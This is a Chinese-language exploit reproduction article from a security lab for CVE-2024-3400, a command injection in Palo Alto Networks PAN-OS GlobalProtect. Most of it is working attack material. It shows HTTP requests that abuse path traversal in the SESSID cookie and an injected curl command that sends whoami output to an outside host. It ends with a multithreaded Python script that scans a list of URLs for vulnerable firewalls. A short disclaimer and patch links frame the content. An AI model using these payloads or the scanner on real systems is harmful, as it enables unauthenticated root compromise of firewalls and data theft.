#  【成功复现】Palo Alto Networks PAN-OS 命令注入漏洞(CVE-2024-3400)   
原创 弥天安全实验室  弥天安全实验室   2024-04-18 00:03  
  
网安引领时代，弥天点亮未来     
  
  
  
  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
**0x00写在前面**  
  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
0x01漏洞介绍Palo Alto Networks PAN-OS是美国Palo Alto Networks公司的一款下一代防火墙软件。Palo Alto Networks PAN-OS 10.2、11.0、11.1存在命令注入漏洞，该漏洞源于GlobalProtect 功能中存在命令注入漏洞，可能使未经身份验证的攻击者在防火墙上以 root权限执行任意代码。0x02影响版本1、 PAN-OS 11.1.* < 11.1.2-h3 2、 PAN-OS 11.0.* < 11.0.4-h1 3、 PAN-OS 10.2.* < 10.2.9-h10x03漏洞复现  
1.访问漏洞环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDnJ4Q61zXthnicpbia1AlTYyZ8f0UxADShmicXa2Pibiby8hkEHtRU3oQa3eLjoFQfeUcr1gEQwAOMLuA/640?wx_fmt=png&from=appmsg "")  
2.对漏洞进行复现 POC （GET）漏洞复现POST /ssl-vpn/hipreport.esp HTTP/1.1Host: 127.0.0.1Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/mt417.txt;Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0             更新测试GET /global-protect/portal/images/mt417.txt执行命令POST /ssl-vpn/hipreport.esp HTTP/1.1Host: 127.0.0.1Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/y`curl${IFS}utkmwudrkm.dgrh3.cn?test=$(whoami)`;Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 03.python代码测试import randomimport stringfrom concurrent.futures import ThreadPoolExecutorimport urllib3import requestsurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)resFile = open("resFile.txt", "w")def GenerateRandomString(length):    characters = string.ascii_lowercase + string.digits    return ''.join(random.choice(characters) for _ in range(length))def CheckFile(url, proxy, filename):    headers = {        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"    }    resp1 = requests.get(url=url + f"/global-protect/portal/images/{filename}.txt", headers=headers, proxies=proxy, verify=False, allow_redirects=False, timeout=10)    resp2 = requests.get(url=url + f"/global-protect/portal/images/{filename}_cve_test.txt", headers=headers, proxies=proxy,                         verify=False, allow_redirects=False, timeout=10)    if resp1.status_code == 403 and resp2.status_code == 404:        return True    else:        return Falsedef CreateFile(url, proxy):    filename = GenerateRandomString(10)    headers = {        "Cookie": f"SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/{filename}.txt;",        "Content-Type": "application/x-www-form-urlencoded",        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"    }    resp = requests.post(url=url + "/ssl-vpn/hipreport.esp", headers=headers, proxies=proxy, verify=False, allow_redirects=False, timeout=10)    if resp.status_code == 200:        if CheckFile(url, proxy, filename):            print(f"[+] {url}")            resFile.write(f"{url}\n")def GetUrls():    with open("urls.txt","r") as f:        for address in f.readlines():            address = address.strip()            yield addressif __name__ == "__main__":     proxy = {         "http": "http://127.0.0.1:8080",    #     "https": "http://127.0.0.1:8080"     }    #proxy = {}     addrs = GetUrls()     max_thread_num = 30     executor = ThreadPoolExecutor(max_workers=max_thread_num)     for addr in addrs:        future = executor.submit(CreateFile, addr, proxy)0x04修复建议目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://security.paloaltonetworks.com/CVE-2024-3400https://attackerkb.com/topics/SSTk336Tmf/cve-2024-3400/rapid7-analysishttps://github.com/h4x0r-dz/CVE-2024-3400?tab=readme-ov-filehttps://github.com/W01fh4cker/CVE-2024-3400-RCE?tab=readme-ov-file弥天简介学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。口号 网安引领时代，弥天点亮未来 知识分享完了喜欢别忘了关注我们哦~学海浩茫，予以风动，必降弥天之润！   弥  天安全实验室  
  
